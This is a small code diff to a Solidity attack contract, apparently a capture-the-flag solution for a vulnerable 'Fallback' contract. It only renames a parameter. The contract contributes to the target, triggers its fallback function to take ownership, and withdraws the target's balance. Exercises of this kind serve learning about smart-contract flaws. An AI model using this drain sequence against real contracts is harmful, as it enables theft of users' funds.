@@ -5,13 +5,13 @@ pragma solidity ^0.8.19;
 import {Broadcasted} from "./Broadcasted.sol";
 
 contract FallbackAttk is Broadcasted {
-    function attack(address payable fallbackCtr) public payable override {
+    function attack(address payable fallbackCtr_) public payable override {
         // contribute to have contributions[msg.sender] > 0
-        IFallback(fallbackCtr).contribute{value: 0.00001 ether}();
+        IFallback(fallbackCtr_).contribute{value: 0.00001 ether}();
         // call fallback function
-        fallbackCtr.call{value: 0.00001 ether}("");
+        fallbackCtr_.call{value: 0.00001 ether}("");
         // withdraw
-        IFallback(fallbackCtr).withdraw();
+        IFallback(fallbackCtr_).withdraw();
     }
 }
 
